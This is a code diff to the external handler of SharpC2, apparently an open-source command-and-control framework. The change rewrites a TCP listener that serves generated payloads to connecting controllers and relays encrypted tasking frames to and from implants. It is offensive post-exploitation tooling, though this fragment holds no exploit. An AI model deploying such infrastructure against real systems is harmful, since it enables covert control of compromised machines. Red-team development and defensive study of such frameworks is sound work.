@@ -1,6 +1,5 @@
 ﻿using System.Net;
 using System.Net.Sockets;
-using System.Text;
 
 using SharpC2.API.Requests;
 using SharpC2.API.Responses;
@@ -19,13 +18,12 @@ public class ExtHandler : Handler
 
     public int BindPort { get; set; }
 
-    private Metadata _metadata;
-
     private readonly IPayloadService _payloads;
     private readonly ICryptoService _crypto;
     private readonly IServerService _server;
     
     private readonly CancellationTokenSource _tokenSource = new();
+    private readonly ManualResetEvent _signal = new(false);
 
     public ExtHandler()
     {
@@ -34,65 +32,90 @@ public class ExtHandler : Handler
         _server = Program.GetService<IServerService>();
     }
 
-    public async Task Start()
+    public Task Start()
+    {
+        return Task.Run(ListenerThread);
+    }
+
+    private void ListenerThread()
     {
         var listener = new TcpListener(new IPEndPoint(IPAddress.Any, BindPort));
         listener.Start(100);
 
-        // blocks
-        var client = await listener.AcceptTcpClientAsync();
-
-        // the first thing we expect is a pipename
-        var stageReq = await client.ReadClient();
-        var pipeName = Encoding.UTF8.GetString(stageReq);
-
-        // create a "fake" handler
-        var handler = new SmbHandler { PipeName = pipeName, PayloadType = PayloadType.EXTERNAL };
-
-        // generate shellcode
-        var payload = await _payloads.GeneratePayload(handler, PayloadFormat.ASSEMBLY);
-
-        // return this to the client
-        await client.WriteClient(payload);
-
-        // drop into a loop
         while (!_tokenSource.IsCancellationRequested)
         {
-            // if anything inbound
-            if (client.DataAvailable())
+            _signal.Reset();
+            listener.BeginAcceptTcpClient(ConnectCallback, listener);
+            _signal.WaitOne();
+        }
+        
+        // stop listener
+        listener.Stop();
+        
+        // dispose token
+        _tokenSource.Dispose();
+    }
+
+    private void ConnectCallback(IAsyncResult ar)
+    {
+        _signal.Set();
+        
+        if (ar.AsyncState is not TcpListener listener)
+            return;
+
+        var controller = listener.EndAcceptTcpClient(ar);
+        
+        // run in own thread
+        var thread = new Thread(HandleClient);
+        thread.Start(controller);
+    }
+
+    private async void HandleClient(object obj)
+    {
+        if (obj is not TcpClient controller)
+            return;
+
+        // get payload
+        var payload = await _payloads.GeneratePayload(this, PayloadFormat.ASSEMBLY);
+        
+        // send it to the controller
+        await controller.WriteClient(payload);
+        
+        Metadata metadata = null;
+        
+        // drop into a loop
+        while (controller.Connected)
+        {
+            if (controller.DataAvailable())
             {
-                var inbound = await client.ReadClient();
-                var frame = inbound.Deserialize<C2Frame>();
+                // read from controller
+                var inbound = await controller.ReadClient();
+                
+                // deserialize it
+                var inFrame = inbound.Deserialize<C2Frame>();
+                
+                // if this is a check-in frame, read the metadata
+                if (inFrame.Type == FrameType.CHECK_IN)
+                    metadata = await _crypto.Decrypt<Metadata>(inFrame.Data);
 
-                // if it's the first check-in frame, save its metadata
-                if (frame.Type == FrameType.CHECK_IN)
-                    _metadata = await _crypto.Decrypt<Metadata>(frame.Data);
-
-                // give frame to server
-                await _server.HandleInboundFrame(frame);
+                // hand it off
+                await _server.HandleInboundFrame(inFrame);
             }
-
-            // if anything outbound
-            if (_metadata is not null)
+            
+            // get outbound frames
+            if (metadata is not null)
             {
-                var frames = (await _server.GetOutboundFrames(_metadata)).ToArray();
+                var outFrames = (await _server.GetOutboundFrames(metadata)).ToArray();
 
-                if (frames.Any())
-                {
-                    var outbound = frames.Serialize();
-                    await client.WriteClient(outbound);
-                }
+                // p2p drones only take 1 frame at a time
+                foreach (var outFrame in outFrames)
+                    await controller.WriteClient(outFrame.Serialize());
             }
 
             await Task.Delay(100);
         }
-
-        client.Dispose();
-        listener.Stop();
-
-        _tokenSource.Dispose();
     }
-   
+
     public void Stop()
     {
         _tokenSource.Cancel();
